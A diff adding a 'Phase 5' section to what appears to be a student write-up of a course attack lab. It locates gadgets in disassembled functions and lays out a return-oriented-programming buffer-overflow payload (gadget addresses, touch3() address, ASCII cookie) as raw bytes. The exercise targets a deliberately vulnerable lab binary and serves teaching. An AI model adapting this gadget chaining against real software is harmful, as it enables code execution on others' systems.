@@ -83,3 +83,57 @@ fa 97 b9 59 00 00 00 00     # Cookie in ASCII
 c5 19 40 00 00 00 00 00     # Address of 2nd gadget
 ec 17 40 00 00 00 00 00     # Address of touch2()
 ```
+
+## Phase 5:
+The cookie can be injected into stack by overflowing the buffer. However, since the stack initializes randomly, we have to use either `lea` or `movq %rsp, %xxx` to get the cookie address.  
+* Locating the stack:
+    ```
+    0000000000401a03 <addval_190>:
+    401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
+    401a09:	c3  
+    ```
+    In which we have
+    ```
+    48 89 e0  movq %rsp, %rax
+    c3        ret
+    ```
+* Because no `popq` instructions exists, we put the cookie string somewhere near the bottom of the stack, away from the gadgets:
+    ```
+    00000000004019d6 <add_xy>:
+    4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
+    4019da:	c3                   	retq   
+    ```
+    In which we have
+    ```
+    04 37     add $0x37, %al
+    c3        ret
+    ```
+* Move cookie address from %rax to %rdi:
+    ```
+    00000000004019c3 <setval_426>:
+    4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
+    4019c9:	c3                   	retq
+    ```
+    In which we have
+    ```
+    48 89 c7  movq %rax, %rdi
+    90        nop
+    c3        retq
+    ```
+Overflow the buffer with:
+```
+00 00 00 00 00 00 00 00     # Padding
+00 00 00 00 00 00 00 00     # Padding
+00 00 00 00 00 00 00 00     # Padding
+00 00 00 00 00 00 00 00     # Padding
+00 00 00 00 00 00 00 00     # Padding
+06 1a 40 00 00 00 00 00     # Address of the 1st gadget
+d8 19 40 00 00 00 00 00     # Address of the 2nd gadget
+c5 19 40 00 00 00 00 00     # Address of the 3rd gadget
+fa 18 40 00 00 00 00 00     # Address of touch3()
+dd dd dd dd dd dd dd dd     # Padding
+dd dd dd dd dd dd dd dd     # Padding
+dd dd dd dd dd dd dd dd     # Padding
+dd dd dd dd dd dd dd        # Padding (0x37(55)-24=31 in total)
+35 39 62 39 39 37 66 61     # Cookie in ASCII
+```
